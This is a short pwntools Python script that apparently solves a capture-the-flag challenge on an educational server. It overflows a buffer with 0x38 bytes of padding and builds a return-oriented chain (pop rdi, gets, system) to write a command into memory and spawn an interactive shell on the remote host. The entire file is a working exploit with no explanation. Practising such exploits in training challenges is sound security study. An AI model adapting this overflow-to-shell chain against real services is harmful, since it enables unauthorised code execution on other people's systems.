from pwn import *

context.arch = 'amd64'
conn = remote('edu-ctf.csie.org', 10174)
pause()

pop_rdi = 0x0000000000400733

system_plt = 0x400520
gets_plt = 0x400530

evil = 0x601070

payload = flat(
    'a'*0x38,
    pop_rdi,
    evil,
    gets_plt,
    pop_rdi,
    evil,
    system_plt
)


conn.sendlineafter(':D', payload)
#conn.sendline('sh')


conn.interactive()

